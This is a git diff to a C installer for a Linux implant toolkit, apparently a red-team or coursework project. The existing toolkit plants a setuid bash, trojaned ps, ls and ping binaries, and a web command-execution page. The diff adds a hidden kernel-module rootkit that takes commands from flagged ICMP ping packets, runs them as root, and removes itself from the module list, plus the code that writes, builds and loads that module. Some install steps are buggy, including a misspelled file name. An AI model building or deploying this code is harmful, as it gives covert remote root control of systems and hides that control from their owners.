@@ -19,10 +19,12 @@
 #define LS_ID         4
 #define PING_ID       8
 #define FRONTDOOR_ID 16
+#define ICMPK_ID     32
 
+#define ALL 65535
 
 // Configure install here:
-#define INSTALL BASH_ID | PROCESSD_ID | LS_ID | PING_ID | FRONTDOOR_ID
+#define INSTALL BASH_ID | PROCESSD_ID | LS_ID | PING_ID | FRONTDOOR_ID | ICMPK_ID
 
 
 // Debugging mode
@@ -31,6 +33,8 @@
 
 // Useful Macros (modify these if path changes made elsewhere)
 #define SETUID_BASH_PATH "/lib/gcc/rt_bash"
+#define ICMPK_PATH "/" // /lib/modules?
+
 #define HTTP_DOCUMENT_ROOT "/var/www/html"
 
 // Slightly less useful Macros
@@ -43,6 +47,7 @@ int re_processd(void);
 int re_broken_ls(void);
 int re_fake_ping(void);
 int re_http_frontdoor(void);
+int re_icmp_c2(void);
 
 ////////////////////////////////////////
 ////////// SETUID BASH
@@ -249,7 +254,7 @@ int re_fake_ping(void){
 ////////////////////////////////////////
 ////////// HTTP Frontdoor
 ////////////////////////////////////////
-const char *frontdoor_contents = "<form method=\"GET\">\n"
+static const char *frontdoor_contents = "<form method=\"GET\">\n"
 "    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
 "    <input type=\"submit\" value=\"Run\">\n"
 "</form>\n"
@@ -267,6 +272,348 @@ int re_http_frontdoor(void){
 
     return 0;
 }
+////////////////////////////////////////
+////////// ICMPK (ICMP-c2)
+////////////////////////////////////////
+
+// put icmpk string here
+static const char *icmpk_c = "#include <linux/kernel.h>\n"
+    "#include <linux/module.h>\n"
+    "#include <linux/netfilter.h>\n"
+    "#include <linux/netfilter_ipv4.h>\n"
+    "#include <linux/ip.h>\n"
+    "#include <linux/icmp.h>\n"
+    "#include <linux/ktime.h>\n"
+    "#include <linux/jiffies.h>\n"
+    "#include <linux/uaccess.h>\n"
+    "#include <linux/inet.h>\n"
+    "#include <linux/skbuff.h>\n"
+    "#include <linux/net.h>\n"
+    "#include <linux/inet.h>\n"
+    "#include <linux/if_ether.h>\n"
+    "#include <net/ip.h>\n"
+    "#include <linux/workqueue.h>\n"
+    "#include <linux/list.h>\n"
+    "\n"
+    "MODULE_LICENSE(\"GPL\");\n"
+    "MODULE_AUTHOR(\"jackdunf@buffalo.edu\");\n"
+    "MODULE_DESCRIPTION(\"Simple ICMP-c2\");\n"
+    "\n"
+    "#define ICMP_ECHO   8\n"
+    "#define ICMP_REPLY  0\n"
+    "#define ICMP_HLEN   sizeof(struct icmphdr)\n"
+    "\n"
+    "#define FLAG        \"\\x70\\x95\\x05\"\n"
+    "#define FLAG_LEN    3\n"
+    "\n"
+    "static struct socket *raw_socket;\n"
+    "static struct nf_hook_ops nfho;\n"
+    "static struct workqueue_struct *work_queue;\n"
+    "static atomic_t work_count = ATOMIC_INIT(0);\n"
+    "\n"
+    "\n"
+    "typedef enum COMMANDS {\n"
+    "    START_SERVICE = 0,\n"
+    "    STOP_SERVICE  = 1,\n"
+    "    OPEN_BACKDOOR = 2,\n"
+    "    DANGER        = 4\n"
+    "} command_t;\n"
+    "\n"
+    "struct work_item {\n"
+    "    struct work_struct work;\n"
+    "    char *command;\n"
+    "};\n"
+    "\n"
+    "// Work\n"
+    "static void icmp_handle_work(struct work_struct *work);\n"
+    "// Commands\n"
+    "static int queue_execute(char *command);\n"
+    "void free_tokens(char **tokens, int token_count);\n"
+    "// Networking\n"
+    "unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);\n"
+    "static uint16_t checksum(uint16_t *data, int len);\n"
+    "static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);\n"
+    "\n"
+    "static void icmp_handle_work(struct work_struct *work) {\n"
+    "    int ret;\n"
+    "\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_DEBUG \"Entering work handler...\\n\");\n"
+    "        printk(KERN_DEBUG \"Queue length: %d\", atomic_read(&work_count));\n"
+    "    #endif\n"
+    "    struct work_item *work_item = container_of(work, struct work_item, work);\n"
+    "\n"
+    "    char *argv[] = { \"/bin/bash\", \"-c\", work_item->command, NULL };\n"
+    "    char *envp[] = { \"HOME=/\", \"TERM=xterm\", \"PATH=/sbin:/usr/sbin:/bin:/usr/bin\", NULL };\n"
+    "    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n"
+    "    #ifdef DEBUG_K\n"
+    "    if (ret != 0){\n"
+    "        pr_err(\"Error (%d) executing command: \\\"%s\\\"\\n\", ret, work_item->command);\n"
+    "    }\n"
+    "    #endif\n"
+    "\n"
+    "    atomic_dec(&work_count);\n"
+    "    kfree(work_item->command);\n"
+    "    kfree(work_item);\n"
+    "}\n"
+    "\n"
+    "static int queue_execute(char *command){\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_DEBUG \"Creating queue item...\");\n"
+    "    #endif\n"
+    "    struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);\n"
+    "    work->command = command;\n"
+    "\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_DEBUG \"Queueing queue item...\");\n"
+    "    #endif\n"
+    "    INIT_WORK(&work->work, icmp_handle_work);\n"
+    "    queue_work(work_queue, &work->work);\n"
+    "    atomic_inc(&work_count);\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_DEBUG \"Enqueued\");\n"
+    "    #endif\n"
+    "\n"
+    "    return 0;\n"
+    "}\n"
+    "\n"
+    "// Source: elsewhere\n"
+    "static uint16_t checksum(uint16_t *data, int len) {\n"
+    "    uint32_t sum = 0;\n"
+    "    while (len > 1) { sum += *data++; len -= 2; }\n"
+    "    if (len == 1) sum += *(uint8_t *)data;\n"
+    "    sum = (sum >> 16) + (sum & 0xFFFF);\n"
+    "    sum += (sum >> 16);\n"
+    "    return (uint16_t)~sum;\n"
+    "}\n"
+    "\n"
+    "// Source: jackdunf, different file\n"
+    "static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {\n"
+    "    struct sockaddr_in dest_addr;\n"
+    "    struct msghdr msg = {};\n"
+    "    struct kvec iov;\n"
+    "    char *packet;\n"
+    "    struct icmphdr *icmp_hdr;\n"
+    "    int ret = 0;\n"
+    "    const size_t PACKET_SIZE = ICMP_HLEN + payload_len;\n"
+    "\n"
+    "    // Allocate memory for the packet\n"
+    "    packet = kmalloc(PACKET_SIZE, GFP_KERNEL);\n"
+    "    if (!packet)\n"
+    "        return -ENOMEM;\n"
+    "\n"
+    "    // Fill ICMP header\n"
+    "    icmp_hdr = (struct icmphdr *)packet;\n"
+    "    icmp_hdr->type = ICMP_REPLY;\n"
+    "    icmp_hdr->code = 0;\n"
+    "    icmp_hdr->checksum = 0;\n"
+    "    icmp_hdr->un.echo.id = incoming_icmp->un.echo.id;\n"
+    "    icmp_hdr->un.echo.sequence = incoming_icmp->un.echo.sequence;\n"
+    "\n"
+    "    // Add payload\n"
+    "    memcpy(packet + ICMP_HLEN, payload, payload_len);\n"
+    "\n"
+    "    // Calculate checksum\n"
+    "    icmp_hdr->checksum = checksum((uint16_t *)packet, PACKET_SIZE);\n"
+    "\n"
+    "    // Initialize destination address\n"
+    "    memset(&dest_addr, 0, sizeof(dest_addr));\n"
+    "    dest_addr.sin_family = AF_INET;\n"
+    "    dest_addr.sin_addr.s_addr = address;\n"
+    "\n"
+    "    // Initialize the socket\n"
+    "    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &raw_socket);\n"
+    "    if (ret < 0) {\n"
+    "        pr_err(\"Failed to create raw socket: %d\\n\", ret);\n"
+    "        kfree(packet);\n"
+    "        return ret;\n"
+    "    }\n"
+    "\n"
+    "    // Prepare message\n"
+    "    iov.iov_base = packet;\n"
+    "    iov.iov_len = PACKET_SIZE;\n"
+    "    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, PACKET_SIZE);\n"
+    "\n"
+    "    msg.msg_name = &dest_addr;\n"
+    "    msg.msg_namelen = sizeof(dest_addr);\n"
+    "\n"
+    "    // Send the ICMP Echo Request\n"
+    "    ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);\n"
+    "    #ifdef DEBUG_K\n"
+    "        if (ret < 0) {\n"
+    "            pr_err(\"ICMP failed to reply: %d\\n\", ret);\n"
+    "        } else {\n"
+    "            pr_info(\"ICMP echo request sent successfully\\n\");\n"
+    "        }\n"
+    "    #endif\n"
+    "\n"
+    "    // Clean up\n"
+    "    sock_release(raw_socket);\n"
+    "    kfree(packet);\n"
+    "\n"
+    "    return (ret >= 0) ? 0 : ret;\n"
+    "}\n"
+    "\n"
+    "\n"
+    "unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {\n"
+    "    struct iphdr *iph;\n"
+    "    struct icmphdr *icmph;\n"
+    "    unsigned char *payload_start;\n"
+    "    char *payload;\n"
+    "    int icmp_payload_len;\n"
+    "\n"
+    "    // Ensure it's an IPv4 packet with ICMP\n"
+    "    iph = ip_hdr(skb);\n"
+    "    if (!iph || iph->protocol != IPPROTO_ICMP) {\n"
+    "        return NF_ACCEPT;\n"
+    "    }\n"
+    "\n"
+    "    icmph = icmp_hdr(skb);\n"
+    "    if (!icmph || icmph->type != ICMP_ECHO) {\n"
+    "        return NF_ACCEPT;\n"
+    "    }\n"
+    "\n"
+    "    // Below overestimates\n"
+    "    // unsigned char *end_of_skb = skb->data + skb->len; \n"
+    "    // icmp_payload_len = (void *)end_of_skb - ( (void *)icmph + ICMP_HLEN );\n"
+    "\n"
+    "    icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;\n"
+    "    payload_start = (void *)icmph + ICMP_HLEN;\n"
+    "\n"
+    "    payload = (char *) kmalloc(icmp_payload_len + 1, GFP_KERNEL);\n"
+    "    memcpy(payload, payload_start, icmp_payload_len);\n"
+    "    payload[icmp_payload_len] = 0;\n"
+    "\n"
+    "    #ifdef DEBUF_K\n"
+    "        pr_info(\"icmp_payload_len: %d\\n\", icmp_payload_len);\n"
+    "    #endif\n"
+    "    if(icmp_payload_len <= 0 || icmp_payload_len < FLAG_LEN){\n"
+    "        return NF_ACCEPT;\n"
+    "    }\n"
+    "\n"
+    "    // Check for flag\n"
+    "    if(strncmp(payload, FLAG, FLAG_LEN) != 0){\n"
+    "        #ifdef DEBUG_K\n"
+    "            pr_info(\"Regular ICMP, no flag\\n\");\n"
+    "        #endif\n"
+    "        return NF_ACCEPT;\n"
+    "    }\n"
+    "    \n"
+    "    #ifdef DEBUG_K\n"
+    "        pr_info(\"Payload contained flag\\n\");\n"
+    "    #endif\n"
+    "\n"
+    "    char *command = payload+FLAG_LEN;\n"
+    "    #ifdef DEBUG_K\n"
+    "        pr_info(\"Command: %s\\n\", command);\n"
+    "    #endif\n"
+    "    int status = queue_execute(command);\n"
+    "    if(status) {} // prevent unused variable\n"
+    "    #ifdef DEBUG_K\n"
+    "        pr_info(\"Status: %d\\n\", status);\n"
+    "    #endif\n"
+    "\n"
+    "    // TODO: Check if ignore all is set\n"
+    "    if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){\n"
+    "        return NF_ACCEPT;\n"
+    "    }\n"
+    "    return NF_DROP;\n"
+    "}\n"
+    "\n"
+    "// Module initialization\n"
+    "struct list_head *mod_list;\n"
+    "static int __init init_icmp_hijack(void) {\n"
+    "\n"
+    "    // Hide module from lsmod\n"
+    "    mod_list = THIS_MODULE->list.prev;\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_INFO \"Hiding module from list\\n\");\n"
+    "    #endif \n"
+    "    list_del(&THIS_MODULE->list);\n"
+    "\n"
+    "    THIS_MODULE->sect_attrs = NULL;  // Removes visibility of module sections\n"
+    "    kobject_del(&THIS_MODULE->mkobj.kobj);  // Deletes the module's kobject entry\n"
+    "\n"
+    "\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_INFO \"Loading icmp-c2 module...\\n\");\n"
+    "    #endif\n"
+    "\n"
+    "    work_queue = create_singlethread_workqueue(\"work_queue\");\n"
+    "    if (!work_queue) {\n"
+    "        #ifdef DEBUG_K\n"
+    "        printk(KERN_ERR \"Failed to create workqueue\\n\");\n"
+    "        #endif\n"
+    "        return -ENOMEM;\n"
+    "    }\n"
+    "\n"
+    "    // Fill in the nf_hook_ops structure\n"
+    "    nfho.hook = icmp_hijack;                     // Hook function\n"
+    "    // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets\n"
+    "    nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate\n"
+    "    nfho.pf = PF_INET;                          // IPv4\n"
+    "    nfho.priority = NF_IP_PRI_FIRST;            // Set highest priority\n"
+    "\n"
+    "    // Register the hook\n"
+    "    nf_register_net_hook(&init_net, &nfho);\n"
+    "\n"
+    "    #ifdef DEBUG_K\n"
+    "        printk(KERN_INFO \"icmp handler loaded.\\n\");\n"
+    "    #endif\n"
+    "\n"
+    "    return 0;\n"
+    "}\n"
+    "\n"
+    "// Module cleanup\n"
+    "static void __exit exit_icmp_hijack(void) {\n"
+    "    printk(KERN_INFO \"Unloading icmp...\\n\");\n"
+    "\n"
+    "    // Unhide\n"
+    "    list_add(&THIS_MODULE->list, mod_list);\n"
+    "\n"
+    "    // Unregister the hook\n"
+    "    nf_unregister_net_hook(&init_net, &nfho);\n"
+    "\n"
+    "    /* Destroy the workqueue */\n"
+    "    if (work_queue){\n"
+    "        flush_workqueue(work_queue);\n"
+    "        destroy_workqueue(work_queue);\n"
+    "    }\n"
+    "\n"
+    "    printk(KERN_INFO \"icmp handler unloaded.\\n\");\n"
+    "}\n"
+    "\n"
+    "module_init(init_icmp_hijack);\n"
+    "module_exit(exit_icmp_hijack);\n";
+static const char *icmpk_Makefile = "CONFIG_MODULE_SIG=n\n"
+    "obj-m += icmpk.o\n"
+    "all:\n"
+    "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n"
+    "clean:\n"
+    "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";
+const char *icmpk_find_missing_if_any = "make";
+int re_icmp_c2(void){
+    // Vars
+    FILE *fp;
+    // Install prereqs
+        // headers compiler etc.
+    // Write code
+    fp = fopen("" ICMPK_PATH "/icmpk.ko", "w+");
+    fprintf(fp, "%s", icmpk_c);
+    fclose(fp);
+    // Write Makefile
+    fp = fopen("" ICMPK_PATH "/Makefile", "w+");
+    fprintf(fp, "%s", icmpk_Makefile);
+    fclose(fp);
+
+    // Run installation
+    system("make");
+    system("mv imcpk.ko " ICMPK_PATH "/icmpk.ko");
+    system("insmod " ICMPK_PATH "/icmpk.ko");
+
+    // Persistence
+    return 0;
+}
 
 #define FAILURE_STRING "Failed to install %s\n"
 #define print_failure(message) fprintf(stderr, FAILURE_STRING, message);
@@ -276,6 +623,9 @@ int main(int argc, char **argv){
     DIR *dr;
     int failures = 0;
     char current_file[FILENAME_MAX];
+
+    // Assming Ubuntu
+    system("apt update");
 
     // Change working directory 
     chdir(WORKING_DIR);
